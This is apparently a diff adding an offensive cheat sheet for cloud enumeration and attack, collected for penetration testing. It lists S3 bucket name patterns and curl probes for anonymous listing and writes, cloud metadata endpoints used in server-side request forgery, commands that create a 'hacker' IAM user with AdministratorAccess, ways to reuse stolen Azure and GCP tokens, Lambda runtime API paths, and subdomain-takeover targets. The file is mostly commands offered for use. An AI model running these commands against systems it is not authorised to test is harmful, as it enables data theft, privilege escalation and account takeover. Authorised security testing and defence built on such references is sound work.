@@ -1,0 +1,137 @@
+# Cloud Enumeration — Payloads & Techniques
+# Sources: PayloadsAllTheThings, HackTricks, cloud_enum, S3Scanner (2025-2026)
+# Categories: S3 Buckets, Cloud Metadata, IAM Testing, Serverless, DNS
+
+# ============================================================
+# SECTION 1: S3 BUCKET ENUMERATION
+# ============================================================
+
+# --- Bucket URL Formats ---
+https://{bucket}.s3.amazonaws.com
+https://{bucket}.s3.us-east-1.amazonaws.com
+https://s3.amazonaws.com/{bucket}
+https://s3-us-east-1.amazonaws.com/{bucket}
+http://{bucket}.s3-website-us-east-1.amazonaws.com
+https://{bucket}.s3.dualstack.us-east-1.amazonaws.com
+
+# --- Common Bucket Names ---
+# {company}-backup, {company}-assets, {company}-uploads
+# {company}-logs, {company}-data, {company}-files
+# {company}-private, {company}-public, {company}-media
+# {company}-config, {company}-templates, {company}-static
+# {company}-cdn, {company}-screenshots, {company}-attachments
+
+# --- Test Endpoints ---
+# Check if bucket exists:
+#   curl -I https://bucket.s3.amazonaws.com
+# Check if bucket is listable:
+#   curl https://bucket.s3.amazonaws.com
+# Check if bucket allows anonymous PUT:
+#   curl -X PUT -d "test" https://bucket.s3.amazonaws.com/test.txt
+# Check bucket policy:
+#   curl https://bucket.s3.amazonaws.com/?policy
+
+# --- AWS CLI Commands ---
+# aws s3 ls s3://bucket-name/ (if credentials available)
+# aws s3 cp local.txt s3://bucket-name/ (write test)
+# aws s3api get-bucket-acl --bucket bucket-name
+# aws s3api get-bucket-policy --bucket bucket-name
+# aws s3api get-bucket-location --bucket bucket-name
+
+# --- Tools ---
+# S3Scanner:     python3 s3scanner.py --bucket bucket-name
+# cloud_enum:    python3 cloud_enum.py -k target.com -k target
+
+# ============================================================
+# SECTION 2: CLOUD METADATA ENDPOINTS (Quick Reference)
+# ============================================================
+
+# AWS:          http://169.254.169.254/latest/meta-data/
+# GCP:          http://metadata.google.internal/computeMetadata/v1/
+# Azure:        http://169.254.169.254/metadata/instance?api-version=2021-02-01
+# DigitalOcean: http://169.254.169.254/metadata/v1.json
+# Oracle:       http://169.254.169.254/opc/v1/instance/
+# Alibaba:      http://100.100.100.200/latest/meta-data/
+# OpenStack:    http://169.254.169.254/openstack/latest/meta_data.json
+
+# ============================================================
+# SECTION 3: IAM TESTING (if you get AWS credentials)
+# ============================================================
+
+# --- Check Who You Are ---
+# aws sts get-caller-identity
+# aws iam list-attached-user-policies --user-name <name>
+# aws iam list-user-policies --user-name <name>
+
+# --- Check Permissions ---
+# aws iam list-roles
+# aws iam list-users
+# aws iam list-groups
+# aws iam list-policies
+# aws ec2 describe-instances
+# aws s3 ls
+# aws s3api list-buckets
+# aws lambda list-functions
+# aws rds describe-db-instances
+
+# --- Privilege Escalation Checks ---
+# aws iam create-user --user-name hacker
+# aws iam create-access-key --user-name hacker
+# aws iam attach-user-policy --user-name hacker --policy-arn arn:aws:iam::aws:policy/AdministratorAccess
+
+# ============================================================
+# SECTION 4: GCP SERVICE ACCOUNT TESTING
+# ============================================================
+
+# --- If you get a GCP token from metadata ---
+# gcloud auth activate-service-account --key-file=token.json
+# gcloud projects list
+# gcloud compute instances list
+# gcloud storage buckets list
+
+# ============================================================
+# SECTION 5: AZURE MANAGED IDENTITY TESTING
+# ============================================================
+
+# --- If you get Azure access token from metadata ---
+# Check token validity:
+#   curl -H "Authorization: Bearer <TOKEN>" https://management.azure.com/subscriptions?api-version=2020-01-01
+# List resources:
+#   curl -H "Authorization: Bearer <TOKEN>" https://management.azure.com/subscriptions/{sub}/resources?api-version=2020-01-01
+
+# ============================================================
+# SECTION 6: SERVERLESS / LAMBDA TESTING
+# ============================================================
+
+# --- Lambda function URLs ---
+# https://{random}.lambda-url.{region}.on.aws/
+
+# --- Check Lambda env variables ---
+# If SSRF to Lambda runtime API:
+#   curl http://localhost:9001/2018-06-01/runtime/invocation/next
+#   curl http://127.0.0.1:9001/2018-06-01/runtime/invocation/next
+
+# ============================================================
+# SECTION 7: DNS / SUBDOMAIN TAKEVOVER
+# ============================================================
+
+# --- Check CNAME records for unclaimed services ---
+# dig CNAME subdomain.target.com
+# Look for:
+#   *.cloudfront.net (AWS CloudFront — claim via CloudFront setup)
+#   *.s3.amazonaws.com (S3 bucket — claim by creating bucket)
+#   *.azureedge.net (Azure CDN)
+#   *.trafficmanager.net (Azure Traffic Manager)
+#   *.github.io (GitHub Pages — claim via repo)
+#   *.herokuapp.com (Heroku — claim by creating app)
+#   *.firebaseio.com (Firebase)
+#   *.zendesk.com (Zendesk)
+#   *.freshdesk.com (Freshdesk)
+#   *.readme.io (Readme.io)
+#   *.helpscout.net (Help Scout)
+#   *.launchdarkly.com (LaunchDarkly)
+#   *.docker.io (Docker Hub)
+
+# --- Tools ---
+# subzy:    subzy run --target target.com
+# nuclei:   nuclei -t ~/nuclei-templates/takeovers/ -l subdomains.txt
